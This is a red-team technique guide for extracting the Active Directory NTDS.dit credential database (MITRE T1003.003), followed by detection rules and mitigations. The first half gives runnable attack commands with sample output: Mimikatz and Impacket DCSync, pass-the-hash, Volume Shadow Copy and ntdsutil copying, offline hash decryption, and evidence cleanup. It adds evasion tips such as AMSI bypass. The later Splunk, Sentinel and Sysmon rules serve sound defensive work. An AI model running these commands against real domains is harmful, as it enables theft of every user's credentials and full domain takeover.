# [CA-DUMP-006]: NTDS.dit Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-006 |
| **MITRE ATT&CK v18.1** | [T1003.003 - NTDS](https://attack.mitre.org/techniques/T1003/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Active Directory Domain Controllers (Server 2008-2025) |
| **Severity** | Critical |
| **CVE** | CVE-2014-6324 (Kerberos PAC bypass - related, not direct vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (no patch exists - inherent AD design) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability to NTDS.dit extraction.

---

## 2. EXECUTIVE SUMMARY

**Concept:** The NTDS.dit file is the Active Directory Domain Services database that stores all critical information for a Windows domain, including user account password hashes (NTLM), Kerberos keys (AES-256, AES-128, DES), group memberships, security descriptors, and account attributes. Attackers with privileged access to a domain controller can extract this file and decrypt it offline using the SYSTEM registry hive's SysKey. Unlike local SAM hashes, NTDS.dit contains passwords for all domain users including service accounts, domain admins, and particularly the krbtgt account—whose hash enables "Golden Ticket" attacks granting indefinite domain admin access. Three distinct extraction methods exist: remote DCSync (exploiting replication rights without DC access), local VSS (Volume Shadow Copy), and direct ntdsutil/esentutl tools.

**Attack Surface:** The primary attack surface is the NTDS.dit file at `C:\Windows\NTDS\ntds.dit` on domain controllers, accessible through three vectors: (1) Remote DCSync via Directory Replication Services API (requires replication permissions), (2) Local Volume Shadow Copy (requires local admin), (3) ntdsutil/esentutl backup export (requires admin). The file is locked during normal DC operation but accessible through these methods without stopping the service.

**Business Impact:** **Complete domain compromise enabling indefinite persistence and lateral movement.** The krbtgt account hash extracted from NTDS.dit allows attackers to forge Golden Tickets (TGTs) valid for 10 years, granting domain admin access to any system without needing valid credentials. Additionally, extracted user hashes enable Pass-the-Hash attacks, offline cracking, credential stuffing against cloud services, and privilege escalation across all domain-joined systems. This is the highest-impact credential target in most organizations.

**Technical Context:** NTDS extraction typically occurs post-compromise when the attacker achieves domain admin privileges or discovers an over-privileged domain user account with replication permissions. DCSync is the stealthiest method (remote, no tool execution on DC). VSS extraction is faster but requires local access. Modern EDR/SIEM solutions detect NTDS access, but many organizations lack proper DS auditing configured.

### Operational Risk

- **Execution Risk:** Medium-High - DCSync requires specific permissions; VSS/ntdsutil require local admin
- **Stealth:** Low - Replication operations and VSS creation are highly detectable; file access is logged if auditing enabled
- **Reversibility:** No - Once domain credentials compromised, assume full domain compromise; requires password reset for all users

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.7 | Ensure that domain controller backups are properly secured |
| **CIS Benchmark** | 2.3.4.1 | Ensure 'Domain Controller: Allow server operators to schedule tasks' is set to 'Disabled' |
| **DISA STIG** | WN16-DC-000200 | The domain controller must be configured to require LDAP channel signing |
| **DISA STIG** | WN16-DC-000240 | The domain controller must require LDAP channel binding |
| **CISA SCuBA** | Authentication | Enforce MFA for privileged access; monitor for suspicious replication |
| **NIST 800-53** | AC-2 | Identification and authentication; privileged account management |
| **NIST 800-53** | AC-3 | Access Enforcement; least privilege for replication permissions |
| **NIST 800-53** | AC-6 | Privileged Access; restrict domain admin group membership |
| **NIST 800-53** | AU-2 | Audit Events; monitor DS access and replication |
| **GDPR** | Article 32 | Security of processing - implement appropriate measures to protect credentials |
| **DORA** | Article 9 | Protection and prevention of ICT incidents affecting financial entities |
| **NIS2** | Article 21 | Cyber risk management for critical infrastructure operators |
| **ISO 27001** | A.6.1.1 | Information security roles and responsibilities (privileged access) |
| **ISO 27001** | A.9.2.1 | Restrict access to information processing facilities (domain controllers) |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights (replication permissions) |
| **ISO 27001** | A.9.4.3 | Password management - protect NTDS and backup security |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- **For DCSync:** Domain user with "Replicating Directory Changes" and "Replicating Directory Changes All" permissions (Domain Admins/Enterprise Admins by default)
- **For VSS/ntdsutil:** Local administrator on domain controller
- **For remote secretsdump:** Valid domain credentials with replication permissions

**Required Access:** 
- Network access to domain controller (port 389 LDAP, 135 RPC for DCSync)
- Local system access (for VSS/ntdsutil)
- Authenticated domain user session (for DCSync from non-DC)

**Supported Versions:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **PowerShell:** 3.0+ (for reconnaissance; 5.0+ for advanced operations)
- **Python:** 3.6+ (for secretsdump.py)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.1.0+, specifically lsadump::dcsync)
- [secretsdump.py](https://github.com/SecureAuthCorp/impacket) (Impacket library 0.9.19+)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (integrated secretsdump)
- [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) (offline NTDS analysis)
- [esentutl.exe](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/use-esentutl-utility-to-copy-locked-database-file) (native Windows tool)
- [ntdsutil.exe](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ntdsutil) (native Windows tool)
- [Diskshadow](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753205(v=ws.11)) (native VSS management)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Reconnaissance – PowerShell (Check Replication Permissions)

**Check if current user has DCSync permissions:**

```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Get current domain
$Domain = (Get-ADDomain).DistinguishedName

# Get ACLs on domain root
$ACL = Get-ACL -Path "AD:\$Domain"

# Check for replication permissions (GUIDs for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All)
$ACL.Access | Where-Object { 
  $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or  # DS-Replication-Get-Changes
  $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"     # DS-Replication-Get-Changes-All
} | Select-Object IdentityReference, AccessControlType

# Alternative: Check if user is Domain Admin
Get-ADGroupMember -Identity "Domain Admins" | Where-Object { $_.SamAccountName -eq $env:USERNAME }
```

**What to Look For:**
- If empty results: User does NOT have replication permissions
- If "Allow" entries present: User CAN perform DCSync
- Domain Admins = automatic DCSync capability

**Version Note:** Identical across Server 2008 R2-2025; only permission model is consistent.

### Reconnaissance – Verify Domain Controller Access

```powershell
# List domain controllers
Get-ADDomainController -Filter * | Select-Object HostName, Name, IPv4Address

# Test connectivity to DC
Test-NetConnection -ComputerName <DC_HOSTNAME> -Port 135  # RPC
Test-NetConnection -ComputerName <DC_HOSTNAME> -Port 389  # LDAP
```

**What to Look For:**
- Connectivity to DC ports (135=RPC, 389=LDAP)
- List of available domain controllers for targeting

### Reconnaissance – Check for Volume Shadow Copies (Local Access)

```powershell
# List available shadow copies (requires local admin on DC)
vssadmin list shadows

# Check if shadow copies exist for system drive
Get-ChildItem -Path "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*"
```

**What to Look For:**
- Shadow copies present = VSS extraction possible
- Multiple copies = options for backup NTDS access

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: DCSync – Remote Replication-Based Extraction (Mimikatz)

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Domain user account with Replicating Directory Changes permissions (Domain Admins by default); network connectivity to DC

#### Step 1: Launch Mimikatz in Domain User Context

**Objective:** Execute Mimikatz with authenticated domain user privileges.

**Command (All Versions):**

```cmd
mimikatz.exe
```

Or with explicit credentials:

```powershell
$Credential = Get-Credential
$SecPassword = ConvertTo-SecureString "DomainAdminPassword" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("DOMAIN\DomainAdmin", $SecPassword)

# Run Mimikatz with those credentials
Invoke-Command -ComputerName <DC_HOSTNAME> -Credential $Cred -ScriptBlock {
  & "C:\tools\mimikatz.exe"
}
```

**Expected Output:**

```
  .#####.   mimikatz 2.2.0 (x64) built on Nov  6 2021 17:53:59
 .## ^ ##.
 ## / \ ##  /*** The one and only Mimikatz
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   https://twitter.com/gentilkiwi
  '#####.    https://github.com/gentilkiwi/mimikatz (oe.eo)

mimikatz #
```

**What This Means:**
- Prompt ready for lsadump commands
- Domain user context confirmed

**OpSec & Evasion:**
- Mimikatz binary is heavily detected; consider:
  - Obfuscated versions
  - In-memory execution only
  - AMSI bypass before execution
- Detection likelihood: **Very High** (AV/EDR signatures)

#### Step 2: Execute lsadump::dcsync Command

**Objective:** Perform DCSync attack to extract all domain user hashes remotely.

**Command (All Versions - Extract All Users):**

```
mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /all
```

**Example:**

```
mimikatz # lsadump::dcsync /domain:contoso.local /all
```

**Expected Output:**

```
[DC] 'contoso.local' will be the domain
[DC] Trying to get DC hostname from 'contoso.local'
[DC] OK, DC1.contoso.local is the domain controller

[DC] Asking for ALL domain users' hashes...
[DC] Using method 1 (RPC)

RID  : 000001F4 (500)
User : Administrator
Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
Hash Kerberos: aes256_hmac ... [long hash]

RID  : 000001F5 (501)
User : Guest
Hash NTLM: aad3b435b51404eeaad3b435b51404ee

RID  : 000003E8 (1000)
User : CONTOSO\jsmith
Hash NTLM: d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1

RID  : 000003E9 (1001)
User : CONTOSO\mwallace
Hash NTLM: 3dbbe83f426b7d7f1e4a8e42b2d5c9f7

RID  : 000003EA (1002)
User : CONTOSO\krbtgt
Hash NTLM: 7ef556ffd1ac36f20373a3c0c03e7fc6
Hash Kerberos: aes256_hmac ... [very long hash - Golden Ticket key]

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash[*])
[*] CredentialsFile : 'lsadump_dcsync_export.txt'
```

**What This Means - Line by Line:**
- **DC hostname discovered:** Target identified via DNS
- **RPC method used:** Directory Replication Protocol
- **Administrator hash:** Built-in admin account
- **krbtgt hash:** THE CRITICAL TARGET - enables Golden Ticket attacks
- **NTLM vs Kerberos:** Both hash types extracted
- **aad3b435... (null LM):** Legacy empty hash

**Stealth & Detection:**
- **No code execution on DC** = most evasive extraction method
- Replication traffic on network may be monitored
- Detection likelihood: **Medium-High** (if network IDS active)

**Troubleshooting:**

| Error | Cause | Fix |
|-------|-------|-----|
| `UNKNOWN_ERROR (0x00000000)` | Invalid replication permissions | Verify Domain Admin or equivalent permissions |
| `Access Denied` | User lacks replication rights | Grant "Replicating Directory Changes" permissions |
| `krbtgt not found` | User account hidden/deleted | Use `/user:krbtgt` explicitly |
| `No DC found` | DNS resolution failure | Specify DC explicitly: `/server:<DC_IP>` |

**Command (Specific User - krbtgt):**

```
mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt
```

**Expected Output (krbtgt only):**

```
RID  : 000001F6 (502)
User : CONTOSO\krbtgt
Hash NTLM: 7ef556ffd1ac36f20373a3c0c03e7fc6
Hash Kerberos: aes256_hmac:[LONG_AES256_KEY]
               aes128_hmac:[AES128_KEY]
               des_cbc_md5:[DES_KEY]
               rc4_hmac:[RC4_KEY]
```

**What This Means:**
- krbtgt hash extracted
- Multiple key types available for different ticket types
- AES-256 = strongest/preferred Kerberos algorithm
- Can now craft Golden Tickets

---

### METHOD 2: DCSync – Remote via secretsdump.py (Impacket)

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Domain credentials, Python 3.6+, network access to DC

#### Step 1: Execute secretsdump.py with Domain Credentials

**Objective:** Remotely extract all domain user hashes using Python.

**Command (All Versions - with Password):**

```bash
python3 -m impacket.examples.secretsdump \
  DOMAIN/DomainAdmin:Password@<DC_IP>
```

**Example:**

```bash
python3 -m impacket.examples.secretsdump \
  contoso/Administrator:P@ssw0rd@192.168.1.10
```

**Expected Output:**

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

[*] Dumping domain cached credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
jsmith:1000:aad3b435b51404eeaad3b435b51404ee:d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1:::
mwallace:1001:aad3b435b51404eeaad3b435b51404ee:3dbbe83f426b7d7f1e4a8e42b2d5c9f7:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7ef556ffd1ac36f20373a3c0c03e7fc6:::

[*] Dumping local SAM hashes (domain\uid:rid:lmhash:nthash)
[*] Domain SID is: S-1-5-21-1234567890-1234567890-1234567890
[*] Kerberos keys extracted
[*] Saving domain hashes to 'hashes.txt'
```

**What This Means:**
- Domain user hashes extracted via DCSync
- Format: domain\username:RID:LM_hash:NT_hash
- krbtgt hash visible (for Golden Tickets)
- Kerberos keys also extracted

**OpSec & Evasion:**
- Network-based (harder to detect on endpoint)
- secretsdump is in Impacket (widely used in pen testing)
- SMB traffic logs may show failed authentication attempts before success
- Detection likelihood: **Medium** (if network monitored)

**Command (Pass-the-Hash Alternative):**

```bash
python3 -m impacket.examples.secretsdump \
  -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  Administrator@192.168.1.10
```

**What This Means:**
- Hash-based authentication (no password needed)
- LM_hash:NT_hash format
- aad3b435... = null LM hash

---

### METHOD 3: VSS (Volume Shadow Copy) – Local NTDS Extraction

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Local administrator access on domain controller

#### Step 1: Create Volume Shadow Copy

**Objective:** Create VSS snapshot to access locked NTDS.dit file.

**Command (All Versions - via vssadmin):**

```cmd
vssadmin create shadow /for=C:
```

**Expected Output:**

```
Successfully created shadow copy for 'C:\'.
Shadow Copy ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
Shadow Copy Set ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
Original Volume: \\?\Volume{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}\
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
Original System Volume: C:\
Shadow Copy Attributes: Persistent, Client-Accessible, No Auto Release, Differential
```

**What This Means:**
- Shadow copy created (frozen filesystem snapshot)
- NTDS.dit accessible from VSS without file locks
- Volume mounted as HarddiskVolumeShadowCopy1

**Alternative (via diskshadow):**

```cmd
diskshadow
# Enter commands:
set context persistent
add volume C:
create
expose %VSS_SHADOW_1% Z:
exit
```

**What This Means:**
- Shadow copy mounted as Z: drive
- Direct file access via drive letter

#### Step 2: Copy NTDS.dit and SYSTEM Hive from VSS

**Objective:** Extract database files from snapshot.

**Command (All Versions - from vssadmin snapshot):**

```cmd
# Copy using symbolic link to VSS
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" "C:\temp\ntds.dit"
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "C:\temp\system"
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "C:\temp\security"
```

Or via PowerShell:

```powershell
$VSS = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
Copy-Item "$VSS\Windows\NTDS\NTDS.dit" "C:\temp\ntds.dit"
Copy-Item "$VSS\Windows\System32\config\SYSTEM" "C:\temp\system"
```

**Expected Output:**

```
# Files silently copied to C:\temp\
# (confirmation via file listing)
```

**What This Means:**
- Files extracted from locked VSS snapshot
- Ready for offline extraction
- No need to stop NTDS service

**OpSec & Evasion:**
- Process auditing may detect file copy operations
- VSS creation itself is suspicious
- Cleanup: Delete shadow copies after extraction
- Detection likelihood: **High** (if monitored)

#### Step 3: Delete Shadow Copy (Cleanup)

**Objective:** Remove VSS to avoid forensic evidence.

**Command (All Versions):**

```cmd
# List shadow copies
vssadmin list shadows

# Delete specific shadow copy (use ID from list)
vssadmin delete shadows /shadow={SHADOW_COPY_ID} /quiet

# Or delete all
vssadmin delete shadows /all /quiet
```

---

### METHOD 4: Using ntdsutil – Export via IFM Backup

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Local administrator on domain controller

#### Step 1: Create IFM Backup Using ntdsutil

**Objective:** Export Active Directory database via Install From Media functionality.

**Command (All Versions):**

```cmd
ntdsutil
# At ntdsutil> prompt:
activate instance ntds
ifm
create full "C:\temp\ntds_backup"
quit
quit
```

Or as one-liner:

```cmd
ntdsutil.exe "ifm" "create full c:\temp\ntds_backup" "q" "q"
```

**Expected Output:**

```
ntdsutil.exe Version 6.2
1668> activate instance ntds
IFM> create full c:\temp\ntds_backup
...
NTDSUtil has successfully created the complete directory database copy in "c:\temp\ntds_backup".
The copy includes files necessary to restore Active Directory.
```

**What This Means:**
- Complete NTDS database exported to folder
- Includes NTDS.dit, SYSTEM hive, and other files
- Folder structure ready for offline analysis

**OpSec & Evasion:**
- ntdsutil.exe is easily detected (native tool, but suspicious context)
- File I/O generates event logs
- Cleanup: Delete backup folder after exfiltration
- Detection likelihood: **Very High**

#### Step 2: Extract Hashes from Offline IFM Backup

**Objective:** Decrypt NTDS hashes using extracted files.

**Command (Using secretsdump.py):**

```bash
# On attacker machine (Linux/Kali)
python3 -m impacket.examples.secretsdump \
  -sam ntds_backup/registry/SAM \
  -system ntds_backup/registry/SYSTEM \
  -ntds ntds_backup/ntds.dit \
  LOCAL
```

Or using DSInternals:

```powershell
# PowerShell (Windows)
Import-Module DSInternals
$Key = Get-BootKey -SystemHivePath "registry\SYSTEM"
Get-ADDBAccount -All -DBPath "ntds.dit" -BootKey $Key | `
  Format-Table SamAccountName, @{Name='NTHash'; Expression={$_.NTHash | ConvertTo-Hex}}
```

---

### METHOD 5: esentutl – Locked Database Copy

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Local administrator on domain controller

**Objective:** Use native ESE utility to copy locked NTDS.dit via VSS.

**Command (All Versions):**

```cmd
esentutl.exe /y /vss "C:\Windows\NTDS\NTDS.dit" /d "C:\temp\ntds.dit"
```

**Expected Output:**

```
Extensible Storage Engine Utilities for Microsoft(R) Windows(R)
Initiating REPAIR mode...
Scanning Status (% complete)
0    10   20   30   40   50   60   70   80   90   100
|----|----|----|----|----|----|----|----|----|----|
..................................................
Successfully copied "C:\Windows\NTDS\NTDS.dit" to "C:\temp\ntds.dit"
```

**What This Means:**
- File copied using VSS internally
- Simpler than manual VSS creation
- Native tool (less suspicious than Mimikatz)

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team – T1003.003

**Atomic Test ID:** T1003.003-1 (DCSync test)

**Test Name:** Domain Controller NTDS Dump via Directory Replication Service

**Description:** Simulates DCSync attack using Mimikatz lsadump::dcsync.

**Supported Versions:** All (Server 2008 R2-2025)

**Command:**

```powershell
Invoke-AtomicTest T1003.003 -TestNumbers 1
```

Or manually:

```powershell
# Atomic simulation - DCSync dump
& "C:\tools\mimikatz.exe" `
  "lsadump::dcsync /domain:contoso.local /user:krbtgt" `
  "exit"
```

**Cleanup:**

```powershell
# No cleanup needed - read-only operation
```

**Reference:** [Atomic Red Team Repository](https://github.com/redcanary/atomic-red-team)

---

## 7. TOOLS & COMMANDS REFERENCE

### Mimikatz – lsadump::dcsync Module

**Version:** 2.2.0 (current as of 2026)

**Minimum Version:** 2.1.0 (first functional DCSync)

**Supported Platforms:** Windows (x86, x64); can be run from any domain-joined system

**Installation:**

```powershell
$Url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $Url -OutFile mimikatz.zip
Expand-Archive mimikatz.zip -DestinationPath C:\tools\
```

**Usage:**

```
mimikatz # lsadump::dcsync /domain:<FQDN> /all
mimikatz # lsadump::dcsync /domain:<FQDN> /user:krbtgt
```

---

### secretsdump.py (Impacket)

**Version:** 0.9.25+

**Supported Platforms:** Linux, macOS, Windows (Python); targets all Windows Server versions

**Installation:**

```bash
pip install impacket
# or
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip install -e .
```

**Usage:**

```bash
# Remote DCSync
python3 -m impacket.examples.secretsdump DOMAIN/User:Pass@DC_IP

# Offline from IFM backup
python3 -m impacket.examples.secretsdump -ntds ntds.dit -system registry/SYSTEM LOCAL
```

---

### DSInternals PowerShell Module

**Version:** Latest from GitHub

**Installation:**

```powershell
Install-Module -Name DSInternals -Repository PSGallery
# or
git clone https://github.com/MichaelGrafnetter/DSInternals.git
Import-Module DSInternals
```

**Usage:**

```powershell
# Analyze offline NTDS.dit
Get-BootKey -SystemHivePath "SYSTEM"
Get-ADDBAccount -All -DBPath "ntds.dit" | Format-Table
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Directory Service Replication Access (Event ID 4662)

**Rule Configuration:**
- **Required Index:** main (Windows Security logs from Domain Controllers)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, ObjectName, ObjectType, Properties
- **Alert Threshold:** > 0 events (immediate)
- **Applies To Versions:** Server 2008 R2+ (if auditing configured)

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4662
  (Properties="*Replicating Directory Changes*" OR 
   Properties="*Replicating Directory Changes All*" OR
   ObjectType="domainDNS")
  AND (Accesses="Read Property" OR Accesses="Control Access")
| stats count by host, Account_Name, ObjectName, Properties
| where count >= 1
```

**What This Detects:**
- Directory Service access events with replication-related properties
- Suspicious AD object access patterns
- Potential DCSync attempts

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `Number of events > 0`
6. Configure **Action** → Send email to SOC
7. Save as: `Domain-Control - Replication Access Attempt`

---

### Rule 2: NTDS.dit File Access or Creation

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, ObjectName, Image
- **Alert Threshold:** Immediate

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" 
  (EventCode=4663 OR EventCode=4656)
  ObjectName="*NTDS.dit" OR ObjectName="*ntdsutil*"
| stats count by host, Account_Name, Image, ObjectName
```

**What This Detects:**
- Direct file access to NTDS.dit
- ntdsutil tool execution
- Suspicious file operations on domain controller

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: DCSync Activity Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceNetworkEvents
- **Required Fields:** EventID, Properties, SourceIpAddress
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All DC versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4662
| where tostring(Properties) has_any ("Replicating Directory Changes", 
                                       "Replicating Directory Changes All")
| where Computer contains "DC" or Computer has_any (toscalar(SecurityEvent | where EventID == 4662 | distinct Computer))
| extend AccountCustomEntity = Account
| extend HostCustomEntity = Computer
| extend IPCustomEntity = IpAddress
| project TimeGenerated, Computer, Account, EventID, Properties
| summarize Count = count(), Events = make_list(Properties) by Computer, Account
| where Count >= 1
```

**Manual Configuration (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `DCSync - Active Directory Credential Dumping`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `1 minute`
   - Lookup data from: `5 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

### Query 2: Volume Shadow Copy Creation on Domain Controller

**Rule Configuration:**
- **Required Table:** DeviceProcessEvents, SecurityEvent
- **Alert Severity:** High

**KQL Query:**

```kusto
DeviceProcessEvents
| where ProcessCommandLine has_any ("vssadmin create shadow", "diskshadow", "esentutl /vss")
| where DeviceName contains "DC"
| extend AccountCustomEntity = InitiatingProcessAccountName
| extend HostCustomEntity = DeviceName
| extend CommandLineCustomEntity = ProcessCommandLine
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4662 (Directory Service Access)**

- **Log Source:** Security
- **Trigger:** Operation on directory service object with replication properties
- **Filter:** `Properties contains "Replicating"` OR `ObjectType = domainDNS`
- **Applies To Versions:** Server 2008 R2+ (if DS auditing enabled)

**Configuration (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **DS Access**
3. Enable: **Audit Directory Service Access** (Success and Failure)
4. Run `gpupdate /force`
5. Verify: **Event Viewer** → **Windows Logs** → **Security** → Filter for Event ID 4662

**Event ID: 4663 (Object Access Attempt)**

- **Log Source:** Security
- **Trigger:** Attempt to read/write NTDS.dit file
- **Filter:** `ObjectName contains "NTDS.dit"` OR `ObjectName contains "ntds"`
- **Applies To Versions:** Server 2008 R2+

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** All Windows Server versions

**Sysmon Configuration Snippet:**

```xml
<!-- Detect NTDS.dit file access and VSS creation -->
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Event ID 1: Process Creation -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">ntdsutil</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">vssadmin create shadow</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">esentutl /vss</CommandLine>
    </ProcessCreate>
    
    <!-- Event ID 11: FileCreate -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">NTDS.dit</TargetFilename>
    </FileCreate>
    
    <!-- Event ID 23: FileDelete (cleanup) -->
    <FileDelete onmatch="include">
      <TargetFilename condition="contains">NTDS</TargetFilename>
    </FileDelete>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious NTDS.dit access" / "Domain controller suspicious file activity"

- **Severity:** Critical
- **Description:** NTDS extraction attempt detected on domain controller
- **Applies To:** Azure VMs running AD with Defender for Servers enabled
- **Remediation:** Isolate DC; review recent administrative access; reset krbtgt password twice

**Manual Configuration (Enable Defender):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable: **Defender for Servers**
4. Click **Save**
5. Go to **Security alerts**

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### M365 Audit Query (if AD compromised leads to M365 access)

```powershell
# Search for suspicious admin access post-compromise
Search-UnifiedAuditLog -Operations "AddMember" -StartDate (Get-Date).AddDays(-1) `
  -EndDate (Get-Date) -ResultSize 1000 | `
  Export-Csv "C:\audit_admin_changes.csv"
```

- **Workload:** AzureActiveDirectory
- **Operations:** AdminLoggedIn, Add/Remove Group Members, Role changes
- **Applies To:** M365 E3+ with auditing enabled

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict and Monitor Replication Permissions**

Minimize users/accounts with dangerous replication permissions.

**Applies To Versions:** Server 2008 R2-2025

**Manual Steps (PowerShell):**

```powershell
# Import AD module
Import-Module ActiveDirectory

# Find accounts with dangerous replication permissions
$Domain = (Get-ADDomain).DistinguishedName
$ACL = Get-ACL -Path "AD:\$Domain"

# Filter for replication GUIDs
$ReplicationACEs = $ACL.Access | Where-Object {
  $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or  # DS-Replication-Get-Changes
  $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"     # DS-Replication-Get-Changes-All
}

# Display over-privileged accounts
$ReplicationACEs | Select-Object IdentityReference, AccessControlType, ObjectType | Format-Table

# Remove dangerous permissions (if not required)
# $ACL.RemoveAccessRule($ACE) # Use carefully!
```

**Validation Command:**

```powershell
# Audit who has replication rights
$ACL = Get-ACL -Path "AD:\DC=contoso,DC=local"
$ReplicationACEs = $ACL.Access | Where-Object {
  $_.IdentityReference -notlike "*SYSTEM*" -and
  ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or
   $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
}

if ($ReplicationACEs.Count -eq 0) {
  Write-Host "✓ Only SYSTEM has replication permissions (Secure)"
} else {
  Write-Host "⚠ WARNING: $($ReplicationACEs.Count) accounts have replication permissions"
}
```

**Expected Output (If Secure):**
```
✓ Only SYSTEM has replication permissions (Secure)
```

---

**2. Enable Directory Service Audit Logging**

Detect NTDS access attempts.

**Applies To Versions:** Server 2008 R2-2025

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **DS Access**
3. Enable: **Audit Directory Service Access** (both Success and Failure)
4. Click **Apply**
5. Run `gpupdate /force` on all DCs

